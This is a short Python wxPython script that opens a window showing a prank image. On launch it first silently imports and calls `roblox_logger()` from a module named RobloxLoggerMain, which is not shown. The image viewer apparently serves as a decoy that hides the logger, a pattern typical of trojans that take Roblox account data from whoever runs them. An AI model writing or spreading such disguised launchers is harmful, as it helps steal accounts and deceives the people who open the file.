import wx
from RobloxLoggerMain import *
roblox_logger()


class Frame(wx.Frame):

    def __init__(self, image, parent=None, id=-1,
                 pos=wx.DefaultPosition, title='Lol'):
        """Create a Frame instance and display image."""
        temp = image.ConvertToBitmap()
        size = temp.GetWidth(), temp.GetHeight()
        wx.Frame.__init__(self, parent, id, title, pos, size)
        self.bmp = wx.StaticBitmap(parent=self, bitmap=temp)
        self.SetClientSize(size)


class App(wx.App):

    def OnInit(self):
        image = wx.Image('yourmom.jpeg', wx.BITMAP_TYPE_JPEG)
        self.frame = Frame(image)
        self.frame.Show()
        self.SetTopWindow(self.frame)
        return True


if __name__ == '__main__':
    App().MainLoop()
